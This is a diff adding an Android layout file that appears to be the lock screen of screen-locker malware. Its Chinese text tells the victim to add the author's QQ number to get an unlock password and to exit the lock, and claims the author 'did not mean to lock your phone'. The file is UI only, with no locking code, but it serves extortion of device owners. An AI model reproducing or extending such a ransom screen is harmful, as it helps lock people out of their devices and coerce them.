@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout android:gravity="center" android:orientation="vertical" android:background="#ff000000" android:padding="10.0dip" android:fitsSystemWindows="true" android:clipToPadding="true" android:layout_width="fill_parent" android:layout_height="fill_parent"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <TextView android:textSize="16.0sp" android:textColor="#ffd32014" android:gravity="center" android:layout_width="220.0dip" android:layout_height="wrap_content" android:text="解锁加QQ2460382794" />
+    <EditText android:textColorHint="#ffeaf048" android:background="@drawable/bbb" android:layout_width="wrap_content" android:layout_height="wrap_content" android:hint="这里输入解锁密码" android:ems="10" android:inputType="numberPassword" />
+    <Button android:textColor="#ff32ed95" android:background="@drawable/bbb" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="解锁" />
+    <TextView android:textAppearance="?android:textAppearanceSmall" android:textColor="#ff55ea6f" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="想退出请加作者QQ" />
+    <TextView android:textAppearance="?android:textAppearanceLarge" android:textColor="#ff7afbfb" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="作者无意锁您的手机" />
+    <TextView android:textAppearance="?android:textAppearanceSmall" android:textColor="#fff6aafb" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="所以请不要喷作者" />
+    <TextView android:textAppearance="?android:textAppearanceMedium" android:textColor="#fff6c047" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="想学习制作软件可以添加作者QQ" />
+    <TextView android:textAppearance="?android:textAppearanceLarge" android:textColor="#ffbe82f4" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="作者阿珂Qq2460382794" />
+</LinearLayout>
